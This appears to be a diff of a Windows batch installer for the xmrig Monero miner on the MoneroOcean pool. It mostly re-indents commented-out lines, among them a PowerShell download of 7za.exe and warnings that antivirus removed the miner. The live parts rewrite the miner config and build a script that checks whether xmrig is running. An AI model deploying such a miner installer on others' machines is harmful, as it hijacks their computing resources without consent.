@@ -111,7 +111,7 @@ echo If needed, miner in foreground can be started by %USERPROFILE%\xmrig\miner.
 REM echo Mining will happen to %WALLET% wallet.
 
 REM if not [%EMAIL%] == [] (
-  REM echo ^(and %EMAIL% email as password to modify wallet options later at https://moneroocean.stream site^)
+REM echo ^(and %EMAIL% email as password to modify wallet options later at https://moneroocean.stream site^)
 REM )
 
 REM echo.
@@ -151,15 +151,15 @@ REM )
 REM echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
 REM powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\moneroocean')"
 REM if errorlevel 1 (
-  REM echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
-  REM powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
-  REM if errorlevel 1 (
-    REM echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
-    REM exit /b 1
-  REM )
-  REM echo [*] Unpacking stock "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
-  REM "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\moneroocean" "%USERPROFILE%\xmrig.zip" >NUL
-  REM del "%USERPROFILE%\7za.exe"
+REM echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
+REM powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
+REM if errorlevel 1 (
+REM echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
+REM exit /b 1
+REM )
+REM echo [*] Unpacking stock "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
+REM "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\moneroocean" "%USERPROFILE%\xmrig.zip" >NUL
+REM del "%USERPROFILE%\7za.exe"
 REM )
 REM del "%USERPROFILE%\xmrig.zip"
 
@@ -170,9 +170,9 @@ REM if %ERRORLEVEL% equ 0 goto MINER_OK
 REM :MINER_BAD
 
 REM if exist "%USERPROFILE%\xmrig\xmrig.exe" (
-  REM echo WARNING: Advanced version of "%USERPROFILE%\xmrig\xmrig.exe" is not functional
+REM echo WARNING: Advanced version of "%USERPROFILE%\xmrig\xmrig.exe" is not functional
 REM ) else (
-  REM echo WARNING: Advanced version of "%USERPROFILE%\xmrig\xmrig.exe" was removed by antivirus
+REM echo WARNING: Advanced version of "%USERPROFILE%\xmrig\xmrig.exe" was removed by antivirus
 REM )
 
 echo [*] Looking for the latest version of Monero miner
@@ -218,9 +218,9 @@ powershell -Command "$out = cat '%USERPROFILE%\xmrig\config.json' | %%{$_ -repla
 if %ERRORLEVEL% equ 0 goto MINER_OK
 
 REM if exist "%USERPROFILE%\xmrig\xmrig.exe" (
-  REM echo WARNING: Stock version of "%USERPROFILE%\xmrig\xmrig.exe" is not functional
+REM echo WARNING: Stock version of "%USERPROFILE%\xmrig\xmrig.exe" is not functional
 REM ) else (
-  REM echo WARNING: Stock version of "%USERPROFILE%\xmrig\xmrig.exe" was removed by antivirus
+REM echo WARNING: Stock version of "%USERPROFILE%\xmrig\xmrig.exe" was removed by antivirus
 REM )
 
 REM exit /b 1
@@ -234,7 +234,7 @@ if [%PASS%] == [] (
   set PASS=na
 )
 REM if not [%EMAIL%] == [] (
-  REM set "PASS=%PASS%:%EMAIL%"
+REM set "PASS=%PASS%:%EMAIL%"
 REM )
 
 REM powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"gulf.moneroocean.stream:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
@@ -252,7 +252,7 @@ REM powershell -Command "New-Object Net.WebClient; .DownloadFile('https://raw.gi
   
 
 
-rem preparing script
+REM preparing script
 (
 echo @echo off
 echo tasklist /fi "imagename eq xmrig.exe" ^| find ":" ^>NUL
@@ -359,7 +359,3 @@ for /L %%A in (12,-1,0) do (
 )
 endlocal & set %~2=%len%
 exit /b
-
-
-
-
